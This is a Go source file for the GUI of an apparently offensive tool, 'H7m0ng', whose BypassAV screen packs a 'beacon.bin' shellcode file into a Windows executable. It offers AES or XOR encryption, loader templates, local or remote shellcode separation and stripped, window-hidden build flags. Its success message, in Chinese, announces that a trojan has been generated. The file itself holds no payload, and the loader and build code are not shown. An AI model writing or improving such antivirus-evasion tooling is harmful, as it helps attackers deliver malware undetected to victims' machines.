package themes

import (
	"H7m0ng/building"
	"H7m0ng/core"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/storage"
	"fyne.io/fyne/v2/widget"
	"log"
	"os"
	"strings"
)

var (
	infProgress *widget.ProgressBarInfinite

	TempOpt = core.Option{
		Module:            "",
		SrcFile:           "beacon.bin",
		ShellcodeEncode:   "",
		Separate:          "",
		ShellcodeLocation: "sc.ini",
		GoBuild:           "",
	}
)

func BypassAV(win fyne.Window) fyne.CanvasObject {

	var fileSrcName string

	loaderTmp := make([]string, 0)
	for _, loaderName := range core.GetLoaderNames() {
		loaderTmp = append(loaderTmp, strings.TrimSuffix(loaderName, ".txt"))
	}

	//loader 选择按钮
	selectLoaderEntry := widget.NewSelect(loaderTmp, func(s string) {
		TempOpt.Module = s
	})
	selectLoaderEntry.PlaceHolder = "loader"

	// 读取bin文件 的选择框
	BypassFileEntry := widget.NewEntry()
	BypassFileEntry.SetText("beacon.bin")
	BypassFileButton := widget.NewButton("File", func() {
		fd := dialog.NewFileOpen(func(reader fyne.URIReadCloser, err error) {
			if err != nil {
				dialog.ShowError(err, win)
				return
			}
			if reader == nil {
				log.Println("Cancelled")
				return
			}
			fileSrcName = reader.URI().Path()
			ext := reader.URI().Extension()
			println(ext)
			if ext != ".bin" {
				dialog.ShowInformation("Error!", ".bin please ！", win)
				return
			}

			BypassFileEntry.SetText(fileSrcName)
		}, win)
		//设置默认位置为当前路径
		pwd, _ := os.Getwd()
		nowFileURI := storage.NewFileURI(pwd)
		listerURI, _ := storage.ListerForURI(nowFileURI)
		fd.SetLocation(listerURI)
		fd.Resize(fyne.NewSize(600, 480))
		fd.Show()
	})
	infProgress = widget.NewProgressBarInfinite()

	infProgress.Stop()
	SelectFileV := container.NewBorder(nil, nil, BypassFileButton, nil, BypassFileEntry)
	//defaultOpt := "default"
	// go 语言编译参数选择
	buildParam := widget.NewSelect([]string{"default", "-race", "-trimpath", "-ldflags=-w", "-ldflags=-s", "-ldflags=-H windowsgui", "-ldflags=-w -s", "-ldflags=-w -s -trimpath"}, func(s string) {
		TempOpt.GoBuild = s
	})
	buildParam.PlaceHolder = "build param(default)"
	//buildParam.SetSelected(defaultOpt)
	// 加密模式单选框
	shellcodeProcess := widget.NewSelect([]string{"AES-ECB", "AES-CBC", "AES-CFB", "AES-OFB", "XOR"}, func(s string) {
		TempOpt.ShellcodeEncode = s
	})
	shellcodeProcess.PlaceHolder = "encrypt way"

	BypassSelectV := container.NewBorder(nil, nil, nil, nil, container.NewGridWithColumns(3, shellcodeProcess, selectLoaderEntry, buildParam))

	//  资源文件添加按钮
	ResourceFileButton := widget.NewSelect([]string{"default", "file1", "file2", "file3", "file4"}, func(s string) {
		TempOpt.ResourceFile = s
	})
	ResourceFileButton.PlaceHolder = "Resource File Add"
	//ResourceFileButton.SetSelected(defaultOpt)

	//分离
	separateLocalFile := widget.NewEntry()
	separateLocalFile.SetPlaceHolder("sc filename or path")
	separateLocalFile.SetText("sc.ini")
	separateLocalFile.Hide()
	toggleContainer := container.NewBorder(nil, nil, nil, nil)
	toggleContainer.AddObject(separateLocalFile)
	SeparateButton := widget.NewSelect([]string{"default", "Local Separate", "Remote Separate"}, func(s string) {
		TempOpt.Separate = s
		if s == "default" {
			separateLocalFile.Hide()
		} else {
			separateLocalFile.Show()
		}
	})

	SeparateButton.PlaceHolder = "Separate Option(default)"
	//SeparateButton.SetSelected(defaultOpt)
	SeparaSelectV := container.NewBorder(nil, nil, nil, nil, container.NewGridWithColumns(3, ResourceFileButton, SeparateButton, separateLocalFile))

	//生成按钮设计，最后再进行的操作，依次执行生成exe过程中所需的函数
	BypassStartButton := widget.NewButton("<<<<<<< Final Build >>>>>>>", func() {
		if TempOpt.Module == "" || TempOpt.ShellcodeEncode == "" {
			dialog.ShowInformation("Error！", "加密模式和loader必不可少", win)
			return
		}
		infProgress.Start()
		// 认证阶段
		MachineId := building.GetMacheId()
		result := building.CheckMacheID(MachineId)
		if result == "fail" {
			dialog.ShowInformation("Error！", "机器码不正确！", win)
			infProgress.Stop()
			return
		}
		if result == "late" {
			dialog.ShowInformation("Error！", "该设备已过期！", win)
			infProgress.Stop()
			return
		}

		TempOpt.SrcFile = BypassFileEntry.Text
		// 设置shellcode的路径
		TempOpt.ShellcodeLocation = separateLocalFile.Text
		core.GenerateGoFile(TempOpt) //生成go文件雏形，仅仅复制而已

		core.StartReplace(TempOpt)         // 生成预构造的go文件
		building.BuildExe(TempOpt.GoBuild) // 构建exe文件
		infProgress.Stop()
		dialog.ShowInformation("success!", "木马生成成功！检查当前result目录下", win)
	})

	return container.NewVBox(
		SelectFileV,
		BypassSelectV,
		SeparaSelectV,
		BypassStartButton,
		infProgress)
}
